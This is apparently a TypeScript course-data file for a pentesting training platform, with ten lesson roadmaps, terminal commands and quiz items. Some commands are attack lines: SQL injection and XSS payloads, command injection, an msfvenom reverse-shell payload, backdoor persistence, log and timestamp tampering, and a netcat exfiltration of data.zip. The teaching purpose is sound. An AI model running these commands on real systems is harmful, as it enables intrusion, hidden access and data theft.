export interface QuizQuestion {
    id: string;
    question: string;
    options: string[];
    correctAnswer: number;
}

export interface TerminalTask {
    id: string;
    description: string;
    command: string;
    validation?: string | RegExp;
}

export interface Lesson {
    id: string;
    title: string;
    duration: string;
    type: 'theory' | 'terminal' | 'quiz';
    xp: number;
    theory: string;
    practiceTasks: string[];
    terminalTasks: TerminalTask[];
    quiz: QuizQuestion[];
}

export interface Module {
    id: string;
    title: string;
    lessons: Lesson[];
}

export interface Roadmap {
    id: string;
    title: string;
    description: string;
    level: 'Beginner' | 'Intermediate' | 'Advanced';
    modules: Module[];
}

// Helper to Create Unique Lessons
const createLesson = (
    id: string,
    title: string,
    duration: string,
    type: 'theory' | 'terminal' | 'quiz',
    xp: number,
    theoryContent: string,
    practice: string[],
    cmd: string,
    quizQ: string,
    quizOpts: string[]
): Lesson => ({
    id,
    title,
    duration,
    type,
    xp,
    theory: theoryContent,
    practiceTasks: practice,
    terminalTasks: [{ id: `term-${id}`, description: `Run task: ${cmd}`, command: cmd }],
    quiz: [{ id: `quiz-${id}`, question: quizQ, options: quizOpts, correctAnswer: 0 }]
});

export const roadmaps: Roadmap[] = [
    // 1. Linux Fundamentals (10 Lessons)
    {
        id: 'linux-fundamentals',
        title: 'Linux Fundamentals',
        description: 'Master the core concepts of Linux, file systems, and the command line interface.',
        level: 'Beginner',
        modules: [
            {
                id: 'mod-lin-1',
                title: 'Introduction to Shell & CLI',
                lessons: [
                    createLesson('linux-1', 'What is Shell?', '5 min', 'theory', 50, '# What is the Shell?\nThe shell is a command-line interpreter that provides a command line interface like Unix-like operating systems.', ['Open terminal', 'Check prompt'], 'echo $SHELL', 'Which shell is default in Kali?', ['Zsh', 'Bash', 'Fish', 'Sh']),
                    createLesson('linux-2', 'Basic Navigation', '15 min', 'terminal', 100, '# Navigation\nMoving around the file system is the first skill to master.', ['Use pwd', 'Use ls'], 'pwd', 'Command to print directory?', ['pwd', 'ls', 'cd', 'dir']),
                    createLesson('linux-3', 'File Manipulation', '20 min', 'terminal', 100, '# Creating Files\nUse `touch` to create files and `mkdir` for directories.', ['Create a file', 'Create a folder'], 'touch newfile.txt', 'Create empty file?', ['touch', 'mkdir', 'rm', 'cp']),
                    createLesson('linux-4', 'Reading Files', '15 min', 'terminal', 100, '# Reading Content\n`cat`, `less`, `head` show file contents.', ['Read /etc/passwd'], 'head /etc/passwd', 'View start of file?', ['head', 'tail', 'cat', 'less']),
                    createLesson('linux-5', 'Deleting Files', '10 min', 'terminal', 150, '# Deletion\n`rm` removes files. Be careful!', ['Delete test file'], 'rm newfile.txt', 'Recursive delete flag?', ['-r', '-f', '-d', '-a']),
                    createLesson('linux-6', 'Wildcards', '15 min', 'terminal', 100, '# Wildcards\n`*` matches any string.', ['List .conf files'], 'ls /etc/*.conf', 'Wildcard related to any string?', ['*', '?', '#', '@']),
                    createLesson('linux-7', 'Redirection', '20 min', 'terminal', 200, '# Redirection\n`>` overwrites, `>>` appends.', ['Redirect echo to file'], 'echo "Hello" > out.txt', 'Append operator?', ['>>', '>', '|', '<']),
                    createLesson('linux-8', 'Finding Files', '20 min', 'terminal', 200, '# Find Command\n`find /path -name filename` locates files.', ['Find log files'], 'find /var -name "*.log"', 'Search from root syntax?', ['find /', 'locate /', 'search /', 'grep /']),
                    createLesson('linux-9', 'Grepping Text', '25 min', 'terminal', 250, '# Grep\nSearch text inside files. `grep "text" file`.', ['Search root in passwd'], 'grep "root" /etc/passwd', 'Search inside file tool?', ['grep', 'sed', 'awk', 'cat']),
                    createLesson('linux-10', 'Permissions Intro', '20 min', 'terminal', 300, '# Permissions\n`ls -l` shows rwx permissions.', ['Check /etc permissions'], 'ls -ld /etc', 'Symbol for read?', ['r', 'w', 'x', '-'])
                ]
            }
        ]
    },
    // 2. Network Analysis (10 Lessons)
    {
        id: 'network-analysis',
        title: 'Network Analysis',
        description: 'Deep dive into TCP/IP, packet analysis, and active reconnaissance.',
        level: 'Intermediate',
        modules: [
            {
                id: 'mod-net-1',
                title: 'Networking & Nmap',
                lessons: [
                    createLesson('net-1', 'OSI Model Basics', '20m', 'theory', 100, '# OSI Model\n7 Layers: Physical..Application.', ['Recite layers'], 'echo "OSI"', 'Layer 3 Protocol?', ['IP', 'TCP', 'HTTP', 'MAC']),
                    createLesson('net-2', 'IP Addressing', '20m', 'terminal', 100, '# IP Config\nCheck your IP with `ip addr`.', ['Check IP'], 'ip addr', 'Loopback address?', ['127.0.0.1', '192.168.1.1', '10.0.0.1', '8.8.8.8']),
                    createLesson('net-3', 'Ping & Connectivity', '15m', 'terminal', 100, '# Ping\nTest reachability using ICMP.', ['Ping Google'], 'ping -c 4 google.com', 'Protocol used by ping?', ['ICMP', 'TCP', 'UDP', 'HTTP']),
                    createLesson('net-4', 'Port Scanning (Nmap)', '25m', 'terminal', 200, '# Nmap\nThe Network Mapper.', ['Scan localhost'], 'nmap localhost', 'Default nmap scan type?', ['SYN', 'Connect', 'UDP', 'Null']),
                    createLesson('net-5', 'Service Version Detection', '25m', 'terminal', 250, '# Version Scanning\nUse `-sV` to get versions.', ['Scan versions'], 'nmap -sV localhost', 'Identify services flag?', ['-sV', '-sS', '-O', '-A']),
                    createLesson('net-6', 'OS Detection', '20m', 'terminal', 300, '# OS Fingerprinting\nUse `-O` to guess OS.', ['Detect OS'], 'sudo nmap -O localhost', 'OS detection flag?', ['-O', '-os', '-A', '-sV']),
                    createLesson('net-7', 'Aggressive Scan', '15m', 'terminal', 200, '# Aggressive Mode\n`-A` combines OS, Version, Script scanning.', ['Aggressive scan'], 'nmap -A localhost', 'Aggressive flag?', ['-A', '-T4', '-p-', '-sC']),
                    createLesson('net-8', 'UDP Scanning', '20m', 'terminal', 250, '# UDP Scan\nUse `-sU` for UDP ports.', ['Scan UDP'], 'sudo nmap -sU localhost', 'Scan UDP ports flag?', ['-sU', '-sT', '-sS', '-u']),
                    createLesson('net-9', 'Saving Output', '10m', 'terminal', 150, '# Output\nSave results with `-oN` or `-oX`.', ['Save scan'], 'nmap -oN scan.txt localhost', 'Save normal format?', ['-oN', '-oX', '-oG', '-oA']),
                    createLesson('net-10', 'Netcat Basics', '20m', 'terminal', 200, '# Netcat\nThe swiss army knife.', ['Listen on port'], 'nc -lvnp 4444', 'Listen flag?', ['-l', '-p', '-e', '-z'])
                ]
            }
        ]
    },
    // 3. Web Application Security (10 Lessons)
    {
        id: 'web-security',
        title: 'Web Application Security',
        description: 'OWASP Top 10, exploitation techniques, and defense strategies.',
        level: 'Advanced',
        modules: [
            {
                id: 'mod-web-1',
                title: 'Web Recon & Attacks',
                lessons: [
                    createLesson('web-1', 'HTTP Basics', '15m', 'terminal', 100, '# HTTP\nGET retrieves, POST sends.', ['Curl a site'], 'curl google.com', 'Method to get data?', ['GET', 'POST', 'PUT', 'DELETE']),
                    createLesson('web-2', 'Analyzing Headers', '20m', 'terminal', 150, '# Headers\nInspect headers with `curl -I`.', ['Check headers'], 'curl -I google.com', 'Flag for headers only?', ['-I', '-v', '-H', '-L']),
                    createLesson('web-3', 'Directory Busting', '25m', 'terminal', 200, '# Gobuster\nBrute-force directories.', ['Run gobuster'], 'gobuster dir -u url -w wordlist', 'Tool for dir busting?', ['Gobuster', 'Nmap', 'Ping', 'Netcat']),
                    createLesson('web-4', 'Robots.txt', '10m', 'terminal', 100, '# Robots.txt\nCheck for disallowed paths.', ['Read robots.txt'], 'curl google.com/robots.txt', 'File defining crawler rules?', ['robots.txt', 'sitemap.xml', 'index.html', 'humans.txt']),
                    createLesson('web-5', 'SQL Injection Intro', '30m', 'theory', 200, '# SQLi\nInjecting SQL code into inputs.', ['Test inputs'], 'echo "SELECT * FROM users"', 'Character to break query?', ["'", '"', ';', '--']),
                    createLesson('web-6', 'Manual SQLi', '30m', 'terminal', 300, '# Manual SQLi\nBypass auth with logic.', ['Try bypass'], "admin' --", 'Comment char in SQL?', ['--', '#', ';', '//']),
                    createLesson('web-7', 'SQLMap', '35m', 'terminal', 400, '# SQLMap\nAutomated SQL injection.', ['Run SQLMap'], 'sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs', 'List databases flag?', ['--dbs', '--tables', '-D', '-T']),
                    createLesson('web-8', 'XSS Reflected', '25m', 'theory', 250, '# XSS\nCross-Site Scripting.', ['Craft alert'], '<script>alert(1)</script>', 'XSS executes where?', ['Browser', 'Server', 'Database', 'Network']),
                    createLesson('web-9', 'Command Injection', '30m', 'terminal', 300, '# CMD Injection\nExecute OS commands.', ['Inject command'], '; id', 'Command separator?', [';', '&', '|', 'All']),
                    createLesson('web-10', 'Burp Suite Proxy', '30m', 'theory', 200, '# Burp Suite\nIntercept requests.', ['Config proxy'], 'echo "Proxy on 8080"', 'Burp is primarily a?', ['Proxy', 'Scanner', 'Firewall', 'IDS'])
                ]
            }
        ]
    },
    // 4. Information Gathering (10 Lessons)
    {
        id: 'info-gathering',
        title: 'Information Gathering',
        description: 'Reconnaissance techniques: Passive vs Active.',
        level: 'Beginner',
        modules: [
            {
                id: 'mod-info-1',
                title: 'Reconnaissance',
                lessons: [
                    createLesson('info-1', 'Passive vs Active', '15m', 'theory', 100, '# Recon Types\nPassive avoids contact. Active touches target.', ['Differentiate'], 'echo "Passive"', 'Scanning ports is?', ['Active', 'Passive', 'Hybrid', 'Static']),
                    createLesson('info-2', 'Whois Lookup', '15m', 'terminal', 100, '# Whois\nDomain registration info.', ['Run whois'], 'whois google.com', 'Tool for domain info?', ['Whois', 'Dig', 'Nmap', 'Ping']),
                    createLesson('info-3', 'DNS Recon (Dig)', '20m', 'terminal', 150, '# Dig\nDNS lookup tool.', ['Run dig'], 'dig google.com', 'Command for DNS?', ['dig', 'ping', 'ip', 'cat']),
                    createLesson('info-4', 'Google Dorking', '20m', 'terminal', 200, '# Dorks\nAdvanced search queries.', ['Search filetype'], 'echo "filetype:pdf site:gov"', 'Operator for file extension?', ['filetype:', 'ext:', 'type:', 'format:']),
                    createLesson('info-5', 'TheHarvester', '25m', 'terminal', 250, '# TheHarvester\nEmail and subdomain gathering.', ['Run harvester'], 'theHarvester -d kali.org -b google', 'Tool for emails?', ['theHarvester', 'Nmap', 'Nikto', 'Wpscan']),
                    createLesson('info-6', 'Shodan Basics', '20m', 'theory', 200, '# Shodan\nSearch engine for devices.', ['Search Shodan'], 'echo "port:22"', 'Shodan searches for?', ['IoT/Servers', 'Websites', 'Images', 'Videos']),
                    createLesson('info-7', 'Subdomain Enumeration', '25m', 'terminal', 250, '# Sublist3r\nFind subdomains.', ['Find subs'], 'sublist3r -d example.com', 'Tool for subdomains?', ['Sublist3r', 'Dirb', 'Cat', 'Grep']),
                    createLesson('info-8', 'WhatWeb', '15m', 'terminal', 150, '# WhatWeb\nIdentify technologies.', ['Scan site'], 'whatweb example.com', 'Tool to identify CMS?', ['WhatWeb', 'Whois', 'Curl', 'Ping']),
                    createLesson('info-9', 'Maltego Intro', '20m', 'theory', 200, '# Maltego\nVisual link analysis.', ['Open Maltego'], 'maltego', 'Maltego focuses on?', ['Relationships', 'Exploits', 'Brute force', 'Coding']),
                    createLesson('info-10', 'Recon-ng', '30m', 'terminal', 300, '# Recon-ng\nWeb recon framework.', ['Start framework'], 'recon-ng', 'Modular recon framework?', ['Recon-ng', 'Metasploit', 'Nmap', 'Wireshark'])
                ]
            }
        ]
    },
    // 5. Vulnerability Assessment (10 Lessons)
    {
        id: 'vuln-analysis',
        title: 'Vulnerability Analysis',
        description: 'Identifying weaknesses using automated scanners.',
        level: 'Intermediate',
        modules: [
            {
                id: 'mod-vuln-1',
                title: 'Scanners & CVEs',
                lessons: [
                    createLesson('vuln-1', 'CVSS Scoring', '20m', 'theory', 100, '# CVSS\nCommon Vulnerability Scoring System (0-10).', ['Check score'], 'echo "CVSS 10.0"', 'Critical score range?', ['9.0-10.0', '7.0-8.9', '4.0-6.9', '0-3.9']),
                    createLesson('vuln-2', 'Nikto Scanner', '25m', 'terminal', 200, '# Nikto\nWeb server scanner.', ['Scan host'], 'nikto -h localhost', 'Tool for web server bugs?', ['Nikto', 'Nmap', 'Ping', 'Dig']),
                    createLesson('vuln-3', 'Nmap Vuln Scripts', '30m', 'terminal', 250, '# Nmap Auth\nNSE scripts for vulns.', ['Run vuln script'], 'nmap --script=vuln localhost', 'Flag for vuln scripts?', ['--script=vuln', '-sV', '-O', '-A']),
                    createLesson('vuln-4', 'Searchsploit', '20m', 'terminal', 200, '# Searchsploit\nOffline Exploit-DB search.', ['Search exploit'], 'searchsploit apache', 'Search for exploits tool?', ['Searchsploit', 'Find', 'Locate', 'Grep']),
                    createLesson('vuln-5', 'OpenVAS Intro', '30m', 'theory', 250, '# OpenVAS\nFull vulnerability scanner.', ['Check status'], 'echo "OpenVAS"', 'Open source heavy scanner?', ['OpenVAS', 'Nessus', 'Qualys', 'Nexpose']),
                    createLesson('vuln-6', 'WPScan', '25m', 'terminal', 250, '# WPScan\nWordPress security scanner.', ['Scan WP site'], 'wpscan --url example.com', 'Scanner for WordPress?', ['WPScan', 'Nikto', 'Nmap', 'Gobuster']),
                    createLesson('vuln-7', 'Nessus Essentials', '20m', 'theory', 200, '# Nessus\nIndustry standard scanner.', ['Read docs'], 'echo "Nessus"', 'Commercial scanner?', ['Nessus', 'Nmap', 'Nikto', 'Dirb']),
                    createLesson('vuln-8', 'Analyzing Reports', '25m', 'theory', 150, '# Reports\nPrioritizing findings.', ['Review finding'], 'echo "False Positive check"', 'First step after scan?', ['Verify findings', 'Exploit immediately', 'Ignore low', 'Delete report']),
                    createLesson('vuln-9', 'CVE Details', '15m', 'theory', 100, '# CVE\nCommon Vulnerabilities and Exposures.', ['Lookup CVE'], 'echo "CVE-2017-0144"', 'Standard ID for bugs?', ['CVE', 'CWE', 'CVSS', 'CPE']),
                    createLesson('vuln-10', 'Mitigation Strategies', '20m', 'quiz', 150, '# Mitigation\nPatching vs Workarounds.', ['Quiz'], 'echo "Patch"', 'Best long term fix?', ['Patching', 'Firewall rule', 'Stopping service', 'Ignoring'])
                ]
            }
        ]
    },
    // 6. Password Attacks (10 Lessons)
    {
        id: 'password-attacks',
        title: 'Password Attacks',
        description: 'Cracking, brute-forcing, and wordlists.',
        level: 'Intermediate',
        modules: [
            {
                id: 'mod-pass-1',
                title: 'Cracking Fundamentals',
                lessons: [
                    createLesson('pass-1', 'Password Storage', '20m', 'theory', 100, '# Hashing\nPasswords are hashed, not encrypted.', ['Understand Hash'], 'echo "Salt"', 'Stored passwords should be?', ['Hashed', 'Encrypted', 'Plaintext', 'Base64']),
                    createLesson('pass-2', 'Hydra Syntax', '25m', 'terminal', 200, '# Hydra\nNetwork logon cracker.', ['Run Hydra help'], 'hydra -h', 'Flag for username?', ['-l', '-p', '-L', '-P']),
                    createLesson('pass-3', 'SSH Crack with Hydra', '30m', 'terminal', 300, '# Cracking SSH\nAttack port 22.', ['Simulate crack'], 'hydra -l user -P list.txt ssh://localhost', 'Protocol for SSH?', ['ssh', 'ftp', 'http', 'telnet']),
                    createLesson('pass-4', 'Wordlists (Rockyou)', '15m', 'terminal', 150, '# Rockyou.txt\nFamous wordlist.', ['Locate wordlist'], 'ls /usr/share/wordlists/rockyou.txt.gz', 'Common text file list?', ['Wordlist', 'Dictionary', 'Rainbow table', 'Salt']),
                    createLesson('pass-5', 'John the Ripper', '30m', 'terminal', 300, '# John\nOffline hash cracker.', ['Test John'], 'john --list=formats', 'Tool for offline hash cracking?', ['John', 'Hydra', 'Nmap', 'Curl']),
                    createLesson('pass-6', 'Hashcat Basics', '25m', 'terminal', 300, '# Hashcat\nGPU accelerated cracking.', ['Check version'], 'hashcat --version', 'Fastest cracker?', ['Hashcat', 'John', 'Hydra', 'Medusa']),
                    createLesson('pass-7', 'Unshadowing', '20m', 'terminal', 250, '# Unshadow\nCombine passwd and shadow.', ['Unshadow'], 'unshadow passwd shadow > hashes', 'Command to merge passwd/shadow?', ['unshadow', 'cat', 'merge', 'join']),
                    createLesson('pass-8', 'Crunch', '20m', 'terminal', 200, '# Crunch\nGenerate wordlists.', ['Generate list'], 'crunch 4 4 0123456789', 'Tool to generate lists?', ['Crunch', 'Cat', 'Grep', 'Sed']),
                    createLesson('pass-9', 'Medusa', '25m', 'terminal', 200, '# Medusa\nParallel network login cracker.', ['Check help'], 'medusa -h', 'Hydra alternative?', ['Medusa', 'Gorgon', 'Snake', 'Titan']),
                    createLesson('pass-10', 'Rainbow Tables', '20m', 'theory', 150, '# Rainbow Tables\nPrecomputed hashes.', ['Read theory'], 'echo "Time-Memory Tradeoff"', 'Defense against Rainbow Tables?', ['Salting', 'Hashing', 'Peppering', 'Encrypting'])
                ]
            }
        ]
    },
    // 7. Wireless Attacks (10 Lessons)
    {
        id: 'wireless-security',
        title: 'Wireless Attacks',
        description: 'Hacking Wi-Fi networks: WEP, WPA2, WPA3.',
        level: 'Intermediate',
        modules: [
            {
                id: 'mod-wifi-1',
                title: 'Aircrack-ng Suite',
                lessons: [
                    createLesson('wifi-1', 'Monitor Mode', '20m', 'terminal', 200, '# Monitor Mode\nCapture all packets.', ['Start monitor'], 'airmon-ng start wlan0', 'Mode to sniff all traffic?', ['Monitor', 'Managed', 'Master', 'Ad-hoc']),
                    createLesson('wifi-2', 'Airodump-ng', '25m', 'terminal', 250, '# Airodump\nScan networks.', ['Scan wifi'], 'airodump-ng wlan0mon', 'Tool to capture IVs/Handshakes?', ['Airodump-ng', 'Aireplay-ng', 'Aircrack-ng', 'Airbase-ng']),
                    createLesson('wifi-3', 'Deauthentication', '20m', 'terminal', 300, '# Deauth Attack\nDisconnect clients.', ['Send deauth'], 'aireplay-ng --deauth 10 -a BSSID wlan0mon', 'Attack to force handshake?', ['Deauth', 'Auth', 'Beacon', 'Probe']),
                    createLesson('wifi-4', 'Cracking WPA2', '30m', 'terminal', 350, '# WPA2 Crack\nDictionary attack on handshake.', ['Crack cap'], 'aircrack-ng -w list.txt capture.cap', 'Tool to crack file?', ['Aircrack-ng', 'John', 'Hashcat', 'Hydra']),
                    createLesson('wifi-5', 'WPS Attacks (Reaver)', '25m', 'terminal', 300, '# WPS\nWi-Fi Protected Setup vuln.', ['Check reaver'], 'reaver -h', 'Vuln in router pin?', ['WPS', 'WPA', 'WEP', 'WPA2']),
                    createLesson('wifi-6', 'Evil Twin', '30m', 'theory', 200, '# Evil Twin\nFake Access Point.', ['Concept'], 'echo "Fake AP"', 'Fake AP attack name?', ['Evil Twin', 'Rogue AP', 'Honeypot', 'All']),
                    createLesson('wifi-7', 'Kismet', '20m', 'terminal', 200, '# Kismet\nPassive wireless sniffer.', ['Run kismet'], 'kismet', 'Passive wifi tool?', ['Kismet', 'Airodump', 'Wireshark', 'Tcpdump']),
                    createLesson('wifi-8', 'MAC Spoofing', '15m', 'terminal', 150, '# Macchanger\nHide identity.', ['Change mac'], 'macchanger -r wlan0', 'Tool to change MAC?', ['Macchanger', 'Ifconfig', 'Ip', 'Route']),
                    createLesson('wifi-9', 'Bluetooth Recon', '20m', 'terminal', 150, '# Bluetooth\nScanning BT devices.', ['Scan bluetooth'], 'hcitool scan', 'Tool for bluetooth?', ['hcitool', 'bluetool', 'btscan', 'wifite']),
                    createLesson('wifi-10', 'Wifite', '15m', 'terminal', 200, '# Wifite\nAutomated wifi attack.', ['Run wifite'], 'wifite --help', 'Automated script?', ['Wifite', 'Fern', 'Kismet', 'Reaver'])
                ]
            }
        ]
    },
    // 8. Metasploit Framework (10 Lessons)
    {
        id: 'metasploit-framework',
        title: 'Metasploit Framework',
        description: 'The world\'s most used penetration testing framework.',
        level: 'Advanced',
        modules: [
            {
                id: 'mod-msf-1',
                title: 'Exploitation with MSF',
                lessons: [
                    createLesson('msf-1', 'MSFConsole', '15m', 'terminal', 100, '# msfconsole\nMain interface.', ['Start MSF'], 'msfconsole -q', 'Command to start metasploit?', ['msfconsole', 'msfvenom', 'msfdb', 'exploit']),
                    createLesson('msf-2', 'Searching Exploits', '20m', 'terminal', 150, '# Search\nFind modules.', ['Search ms17-010'], 'search ms17-010', 'Command to find exploits?', ['search', 'find', 'lookup', 'use']),
                    createLesson('msf-3', 'Selecting Modules', '15m', 'terminal', 150, '# Use\nSelect a module.', ['Use exploit'], 'use exploit/windows/smb/ms17_010_eternalblue', 'Command to load exploit?', ['use', 'load', 'set', 'run']),
                    createLesson('msf-4', 'Setting Payloads', '20m', 'terminal', 200, '# Payload\nCode to run after exploit.', ['Show payloads'], 'show payloads', 'Command to list payloads?', ['show payloads', 'list payloads', 'get payloads', 'set payload']),
                    createLesson('msf-5', 'Setting Options', '20m', 'terminal', 200, '# Options\nConfigure RHOSTS, LHOST.', ['Show options'], 'show options', 'Command to see params?', ['show options', 'view options', 'config', 'params']),
                    createLesson('msf-6', 'Exploiting', '25m', 'terminal', 300, '# Exploit\nLaunch attack.', ['Run exploit'], 'exploit -z', 'Command to run?', ['exploit', 'attack', 'start', 'go']),
                    createLesson('msf-7', 'Meterpreter Basics', '30m', 'terminal', 350, '# Meterpreter\nAdvanced payload.', ['System info'], 'sysinfo', 'Command for system info?', ['sysinfo', 'info', 'id', 'uname']),
                    createLesson('msf-8', 'Msfvenom', '30m', 'terminal', 300, '# Msfvenom\nPayload generator.', ['Generate exe'], 'msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe', 'Tool to create payload?', ['Msfvenom', 'Msfconsole', 'Msfpayload', 'Msfencode']),
                    createLesson('msf-9', 'Database integration', '20m', 'terminal', 200, '# Workspace\nSave results.', ['Check db'], 'db_status', 'Check database status?', ['db_status', 'status', 'check_db', 'db']),
                    createLesson('msf-10', 'Encoders', '25m', 'terminal', 250, '# Encoders\nEvade AV.', ['List encoders'], 'show encoders', 'Command to list encoders?', ['show encoders', 'list encoders', 'get encoders', 'encode'])
                ]
            }
        ]
    },
    // 9. Sniffing & Spoofing (10 Lessons)
    {
        id: 'sniffing-spoofing',
        title: 'Sniffing & Spoofing',
        description: 'Man-in-the-Middle attacks and packet capture.',
        level: 'Intermediate',
        modules: [
            {
                id: 'mod-mitm-1',
                title: 'MITM Attacks',
                lessons: [
                    createLesson('mitm-1', 'Wireshark Filters', '25m', 'terminal', 200, '# Filters\nRefine captures.', ['Filter tcp 80'], 'tcp.port == 80', 'Filter logic?', ['Display Filters', 'Capture Filters', 'BPF', 'Scripts']),
                    createLesson('mitm-2', 'ARP Spoofing', '25m', 'terminal', 300, '# ARP Spoof\nRedirect traffic.', ['Enable forwarding'], 'echo 1 > /proc/sys/net/ipv4/ip_forward', 'Kernel param for forwarding?', ['ip_forward', 'forwarding', 'routing', 'gateway']),
                    createLesson('mitm-3', 'Ettercap', '30m', 'terminal', 300, '# Ettercap\nSuite for MITM.', ['Text mode'], 'ettercap -T', 'Flag for text mode?', ['-T', '-G', '-C', '-D']),
                    createLesson('mitm-4', 'DNS Spoofing', '30m', 'theory', 250, '# DNS Spoofing\nFake DNS replies.', ['Concept'], 'echo "dns_spoof"', 'Redirecting a domain is?', ['DNS Spoofing', 'ARP Spoofing', 'IP Spoofing', 'MAC Spoofing']),
                    createLesson('mitm-5', 'Responder', '25m', 'terminal', 250, '# Responder\nLLMNR/NBT-NS Poisoner.', ['Run responder'], 'responder -I eth0', 'Attacks which protocols?', ['LLMNR', 'HTTP', 'SSH', 'DNS']),
                    createLesson('mitm-6', 'Tcpdump', '20m', 'terminal', 200, '# Tcpdump\nCLI packet analyzer.', ['Capture eth0'], 'tcpdump -i eth0', 'Flag for interface?', ['-i', '-I', '-int', '-interface']),
                    createLesson('mitm-7', 'Bettercap', '30m', 'terminal', 350, '# Bettercap\nModern MITM framework.', ['Run bettercap'], 'sudo bettercap', 'Modern alternative to Ettercap?', ['Bettercap', 'Wireshark', 'Nmap', 'Ping']),
                    createLesson('mitm-8', 'SSL Stripping', '30m', 'theory', 300, '# SSL Strip\nDowngrade HTTPS to HTTP.', ['Concept'], 'echo "HSTS prevents this"', 'What prevents SSL Stripping?', ['HSTS', 'SSL', 'TLS', 'Certificates']),
                    createLesson('mitm-9', 'MAC Flooding', '20m', 'theory', 200, '# MAC Flood\nOverload switch CAM table.', ['Concept'], 'macof', 'Result of CAM overflow?', ['Fail open (Hub mode)', 'Shutdown', 'Reboot', 'Lockdown']),
                    createLesson('mitm-10', 'Credential Sniffing', '25m', 'theory', 250, '# Sniffing Creds\nCleartext protocols.', ['Protocols'], 'echo "FTP, Telnet, HTTP"', 'Which is cleartext?', ['Telnet', 'SSH', 'HTTPS', 'SFTP'])
                ]
            }
        ]
    },
    // 10. Post-Exploitation (10 Lessons)
    {
        id: 'post-exploitation',
        title: 'Post-Exploitation',
        description: 'Privilege escalation, persistence, and looting.',
        level: 'Advanced',
        modules: [
            {
                id: 'mod-post-1',
                title: 'Maintaining Access',
                lessons: [
                    createLesson('post-1', 'Privilege Escalation Basics', '20m', 'theory', 150, '# PrivEsc\nUser -> Root.', ['Goal'], 'id', 'Ultimate goal?', ['Root/System', 'User', 'Guest', 'Service']),
                    createLesson('post-2', 'LinPEAS', '25m', 'terminal', 300, '# LinPEAS\nAuto enumeration script.', ['Run linpeas'], './linpeas.sh', 'Tool for Linux privesc?', ['LinPEAS', 'WinPEAS', 'Nmap', 'Dirb']),
                    createLesson('post-3', 'SUID Abuse', '25m', 'terminal', 250, '# SUID\nExploiting SUID binaries.', ['Find SUID'], 'find / -perm -4000 2>/dev/null', 'Permission bit 4000?', ['SUID', 'SGID', 'Sticky', 'Read']),
                    createLesson('post-4', 'Cron Jobs', '25m', 'theory', 200, '# Cron\nScheduled tasks.', ['Check cron'], 'cat /etc/crontab', 'Where are system crons?', ['/etc/crontab', '/var/cron', '/tmp', '/home']),
                    createLesson('post-5', 'Kernel Exploits (Dirty Cow)', '30m', 'theory', 300, '# Kernel Exploits\nOld kernels are vulnerable.', ['Check kernel'], 'uname -a', 'Famous kernel exploit?', ['Dirty Cow', 'EternalBlue', 'Heartbleed', 'Log4j']),
                    createLesson('post-6', 'Persistence: SSH Keys', '20m', 'terminal', 200, '# SSH Keys\nAdd key to authorized_keys.', ['Add key'], 'echo "key" >> ~/.ssh/authorized_keys', 'Where to add pubkey for access?', ['authorized_keys', 'id_rsa', 'known_hosts', 'config']),
                    createLesson('post-7', 'Persistence: User Creation', '15m', 'terminal', 200, '# Backdoor User\nCreate user.', ['Add user'], 'useradd -m backdoor', 'Command to add user?', ['useradd', 'adduser', 'newuser', 'createuser']),
                    createLesson('post-8', 'Clearing Tracks', '20m', 'terminal', 150, '# Logs\nRemove evidence.', ['Clear history'], 'history -c', 'Command to clear history?', ['history -c', 'clear', 'rm', 'cls']),
                    createLesson('post-9', 'Timestomping', '25m', 'terminal', 250, '# Timestomping\nModify file timestamps.', ['Touch date'], 'touch -d "2020-01-01" file', 'Modify timestamp tool?', ['touch', 'date', 'time', 'stat']),
                    createLesson('post-10', 'Data Exfiltration', '30m', 'terminal', 300, '# Exfiltration\nStealing data.', ['Netcat exfil'], 'nc target 4444 < data.zip', 'Sending data out matches?', ['Exfiltration', 'Infiltration', 'Exploitation', 'Recon'])
                ]
            }
        ]
    }
];
